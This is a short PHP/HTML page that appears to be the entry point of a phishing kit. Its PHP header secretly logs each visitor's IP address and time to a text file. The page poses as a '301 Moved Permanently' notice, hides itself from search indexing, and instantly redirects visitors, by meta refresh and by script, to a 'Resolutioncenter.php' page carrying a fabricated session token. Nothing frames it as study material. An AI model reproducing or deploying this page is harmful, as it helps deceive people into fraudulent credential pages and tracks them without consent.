<?
$ip = getenv("REMOTE_ADDR");
$file = fopen("View.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
?>
<html><head><title>301 Moved Permanently</title><!--googleoff: all-->
<meta http-equiv="Description" content=" notneeded "><!--googleon: all--><!--googleoff: all-->
<meta http-equiv="Keywords" content=" notneeded "><!--googleon: all--><!--googleoff: all-->
<meta http-equiv="refresh" content="0; URL=Resolutioncenter.php?#/_flow&SESSION=PnlUc3mEHJJHI55454Op215LMp87878ijQ9wUub3cFpG7mo2DssMkja2121545487KJJHHG5548782121548LLOpm54548">
<script language="JavaScript" type="text/javascript">
<!--
function redirect() { 
setTimeout("window.location.replace('Resolutioncenter.php?#/_flow&SESSION=PnlUc3mEHJJHI55454Op215LMp87878ijQ9wUub3cFpG7mo2DssMkja2121545487KJJHHG5548782121548LLOpm54548')", 0); }
-->
</script>
</head>